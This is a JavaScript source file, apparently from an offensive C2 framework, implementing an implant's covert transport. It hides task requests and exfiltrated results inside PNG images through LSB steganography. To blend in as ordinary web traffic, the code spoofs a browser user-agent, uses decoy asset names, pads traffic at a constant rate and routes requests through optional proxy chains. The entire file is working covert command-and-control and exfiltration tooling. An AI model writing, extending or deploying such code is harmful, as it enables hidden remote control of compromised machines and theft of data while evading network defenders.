// VARVEL — agent-side steganography transport client ('stg') for the governed callback channel.
//
// The agent's half of the image-carried fallback wire (engine/stegocodec.mjs is the
// codec; the routes live in callback.mjs on the channel's own HTTP listener):
//   pull: GET /stg/i/<asset>.png?d=<base64url envelope>  -> 200 image/png, the down
//         envelope LSB-embedded in the pixels (empty envelope = idle/denied — uniform)
//   push: POST /stg/u (content-type image/png), the up-envelope embedded in an "uploaded"
//         image -> 204 always (accept ≡ deny on the wire; the ledger is the loud place)
//
// SAME governance contract as DnsTransport: strictly-increasing seq, per-message HMAC,
// chunked push with per-chunk authentication — the envelope objects are byte-identical
// to the dns/ws wires and land in the channel's shared intake. RATE REALITY (honest):
// each pull is one ~25-40 KB image carrying <= ~6.1 KB of envelope; each push chunk
// (2,046 raw bytes) is another image. Low bandwidth, high latency — the last-resort
// 443-image-blend fallback, never a primary wire. Size and timing side-channels are
// documented in docs/AGENT-GUIDE.md — no traffic-analysis immunity is claimed.
//
// GHOST THREADING: `agents` is the Ghost.agents() shape ({ httpAgent, httpsAgent }) —
// when the engagement arms a ghost chain the image fetches ride it exactly like the
// ghc mailbox leg (engine/ghost GhostHttpAgent). null = direct.

import http from 'node:http';
import https from 'node:https';
import crypto from 'node:crypto';
import { encodeStgPng, decodeStgPng, STG_PROFILES, STG_DEFAULTS } from '../engine/stegocodec.mjs';
import { b32decode } from '../engine/dnscodec.mjs';
import { deriveEncKey, sealBytes, isSealedString, openString } from '../engine/envelope.mjs';

const hmac = (key, msg) => crypto.createHmac('sha256', String(key)).update(String(msg)).digest('hex');

// 3-aligned so per-chunk base64 concatenates padding-free in the channel's reassembly
// (the dns wire's PUSH_CHUNK=96 obeys the same rule). Envelope JSON ≈ 2.9 KB — inside
// the default 128x128 frame's 6,133-byte capacity with room for two-digit chunk counts.
const PUSH_CHUNK = 2046;

// The innocuous asset pool the pull path picks from (the route pattern is conservative:
// lowercase, dashes, .png — anything else never reaches the image logic).
const ASSETS = ['hero-banner.png', 'logo-full.png', 'promo-card.png', 'sprite-ui.png', 'cover-art.png'];

export class StgTransport {
  constructor({ url, agentId, token, profile = STG_DEFAULTS.profile, agents = null, timeout = 8000, enc = false } = {}) {
    if (!url) throw new TypeError('StgTransport: url required (http://host:port of the channel listener)');
    this.agentId = String(agentId || '');
    this.token = String(token || '');
    this.profile = STG_PROFILES.includes(profile) ? profile : STG_DEFAULTS.profile;
    this.agents = agents || null; // ghost seam — { httpAgent, httpsAgent } (engine/ghost)
    this.timeout = timeout;
    this.seq = 0;
    this.lastError = null; // typed stego failure code from the last pull (loud, never silent)
    // Envelope encryption (engine/envelope): seal push CONTENT, require sealed task
    // replies (a plaintext reply is a refused downgrade — lastError stays loud).
    this.enc = enc === true;
    this._encKey = null;
    const u = new URL(url);
    this.https = u.protocol === 'https:';
    this.host = u.hostname;
    this.port = Number(u.port) || (this.https ? 443 : 80);
  }

  _key() { if (!this._encKey) this._encKey = deriveEncKey(this.token, this.agentId); return this._encKey; }

  // One HTTP round trip. Never throws — a dead wire reads as null (idle), exactly like
  // the dns client's empty-reply doctrine; the agent's failover counts it either way.
  _request(method, path, { body = null, contentType = null } = {}) {
    return new Promise((resolve) => {
      const lib = this.https ? https : http;
      const req = lib.request({
        hostname: this.host, port: this.port, path, method,
        agent: this.agents ? (this.https ? this.agents.httpsAgent : this.agents.httpAgent) : undefined,
        timeout: this.timeout,
        headers: {
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
          accept: 'image/avif,image/webp,image/png,image/*,*/*;q=0.8',
          ...(contentType ? { 'content-type': contentType } : {}),
          ...(body ? { 'content-length': body.length } : {}),
          connection: 'close',
        },
      }, (res) => {
        const chunks = [];
        res.on('data', (d) => chunks.push(d));
        res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks) }));
        res.on('error', () => resolve(null));
      });
      req.on('error', () => resolve(null));
      req.on('timeout', () => { try { req.destroy(); } catch {} resolve(null); });
      if (body) req.write(body);
      req.end();
    });
  }

  async _imagePull(env) {
    const d = Buffer.from(JSON.stringify(env), 'utf8').toString('base64url');
    const asset = ASSETS[(Math.random() * ASSETS.length) | 0];
    const r = await this._request('GET', '/stg/i/' + asset + '?d=' + d);
    if (!r || r.status !== 200 || !r.body.length) return null;
    let payload;
    try { payload = decodeStgPng(r.body); } catch (e) {
      // A non-stego/corrupt image is fail-closed idle on the wire — but the TYPED reason
      // stays visible to the agent (lastError) and the sim-agent notes it in its log.
      this.lastError = (e && e.code) || 'decode-failed';
      return null;
    }
    this.lastError = null;
    return payload; // Buffer, empty for the uniform idle/deny envelope
  }

  // Check in; returns the task object { taskId, kind, data } or null (idle/denied — uniform).
  async pull() {
    const s = ++this.seq;
    const env = { a: this.agentId, s, h: hmac(this.token, `${this.agentId}:${s}:pull`) };
    if (this.enc) env.ec = 1; // envelope-encryption capability flag (engine/envelope)
    const payload = await this._imagePull(env);
    if (!payload || !payload.length) return null;
    const replyStr = payload.toString('utf8');
    if (this.enc) {
      // enc agent: the task reply MUST be sealed — a plaintext one is a downgrade,
      // refused loudly (lastError), never tasked from.
      if (!isSealedString(replyStr)) { this.lastError = 'enc-plaintext-reply'; return null; }
      let plain;
      try { plain = openString(this._key(), replyStr); } catch (e) { this.lastError = 'enc-open-failed:' + ((e && e.code) || 'open'); return null; }
      const buf = b32decode(plain);
      if (!buf) return null;
      try { return JSON.parse(buf.toString('utf8')); } catch { return null; }
    }
    const buf = b32decode(replyStr);
    if (!buf) return null;
    try { return JSON.parse(buf.toString('utf8')); } catch { return null; }
  }

  // Padding dummy (constant-rate shaping): same wire shape as a pull, 'pad' HMAC context —
  // the channel audits it as padding and serves the uniform empty-envelope image.
  async pad() {
    const s = ++this.seq;
    const env = { a: this.agentId, s, h: hmac(this.token, `${this.agentId}:${s}:pad`) };
    if (this.enc) env.ec = 1;
    const payload = await this._imagePull(env);
    return payload !== null;
  }

  // Push a result body: one "uploaded" image per 2,046-byte chunk, per-chunk HMAC.
  // Returns true when every chunk was POSTed (the wire answers 204 with no app-level
  // ack — the /d push doctrine). Big outputs belong on http/ws artifact staging.
  // enc: each chunk is AEAD-SEALED first (encrypt-then-MAC — the per-chunk HMAC then
  // authenticates the ciphertext; the formula is unchanged).
  async push(taskId, body) {
    const buf = Buffer.isBuffer(body) ? body : Buffer.from(String(body ?? ''), 'utf8');
    const chunks = [];
    for (let i = 0; i < buf.length; i += PUSH_CHUNK) chunks.push(buf.subarray(i, Math.min(i + PUSH_CHUNK, buf.length)));
    if (!chunks.length) chunks.push(Buffer.alloc(0));
    const n = chunks.length;
    for (let i = 0; i < n; i++) {
      const s = ++this.seq;
      const d = (this.enc ? sealBytes(this._key(), chunks[i]) : chunks[i]).toString('base64');
      const env = { a: this.agentId, s, h: hmac(this.token, [this.agentId, s, String(taskId), i, n, d].join(':')), t: String(taskId), k: 'push', i, n, d };
      const png = encodeStgPng(Buffer.from(JSON.stringify(env), 'utf8'), { profile: this.profile });
      const r = await this._request('POST', '/stg/u', { body: png, contentType: 'image/png' });
      if (!r) return false;
    }
    return true;
  }

  close() { /* stateless — sockets live in the (possibly ghost) agents, never held here */ }
}

export { PUSH_CHUNK as STG_PUSH_CHUNK, ASSETS as STG_ASSETS };
